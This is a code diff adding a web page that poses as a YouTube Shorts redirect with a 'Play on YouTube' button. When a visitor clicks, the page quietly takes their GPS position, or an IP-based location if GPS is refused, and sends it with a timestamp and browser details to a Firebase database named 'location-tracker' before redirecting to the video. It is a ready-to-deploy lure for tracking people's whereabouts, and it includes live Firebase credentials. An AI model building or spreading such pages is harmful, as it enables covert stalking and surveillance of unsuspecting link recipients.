@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YouTube Shorts Redirect with Location</title>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      background: #f4f7fc;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 20px;
+    }
+    button {
+      padding: 12px 20px;
+      font-size: 18px;
+      font-weight: bold;
+      color: white;
+      background: #ff0000;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #cc0000;
+    }
+    #status {
+      margin-top: 15px;
+      font-size: 16px;
+      font-weight: bold;
+      color: #007bff;
+    }
+  </style>
+</head>
+<body>
+  <h2>Watch on YouTube</h2>
+  <button id="playBtn">▶️ Play on YouTube</button>
+  <p id="status"></p>
+
+  <script>
+    // 🔹 Your YouTube Shorts link
+    const youtubeLink = "https://www.youtube.com/shorts/KedF7uEjiTs";
+
+    // 🔹 Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBlvUQ7EpySZ-4lvbWuKOan7XSrNvTHIq8",
+      authDomain: "location-tracker-d10ec.firebaseapp.com",
+      databaseURL: "https://location-tracker-d10ec-default-rtdb.firebaseio.com",
+      projectId: "location-tracker-d10ec",
+      storageBucket: "location-tracker-d10ec.firebasestorage.app",
+      messagingSenderId: "111876457066",
+      appId: "1:111876457066:web:78c76e424dff3dbcae8013",
+      measurementId: "G-CC2DC0L55R"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const playBtn = document.getElementById("playBtn");
+    const statusEl = document.getElementById("status");
+
+    playBtn.addEventListener("click", () => {
+      statusEl.textContent = "🎬 Video will play in 3 seconds...";
+
+      // First try GPS location
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            saveLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+          },
+          () => {
+            // If user denied GPS → fallback to IP location
+            getIPLocation();
+          }
+        );
+      } else {
+        // No GPS support → fallback to IP location
+        getIPLocation();
+      }
+
+      // Redirect after 3 sec
+      setTimeout(() => {
+        window.location.href = youtubeLink;
+      }, 3000);
+    });
+
+    // Save location to Firebase
+    function saveLocation(lat, lon, acc = "IP-based") {
+      const payload = {
+        event: "button_clicked",
+        latitude: lat,
+        longitude: lon,
+        accuracy: acc,
+        timestamp: new Date().toLocaleString(),
+        userAgent: navigator.userAgent,
+        videoUrl: youtubeLink
+      };
+      database.ref("visitors").push(payload);
+    }
+
+    // Get approx location via IP (no permission needed)
+    function getIPLocation() {
+      fetch("https://ipapi.co/json/")
+        .then(res => res.json())
+        .then(data => {
+          saveLocation(data.latitude, data.longitude, "IP-based");
+        })
+        .catch(() => {
+          saveLocation("N/A", "N/A", "unknown");
+        });
+    }
+  </script>
+</body>
+</html>
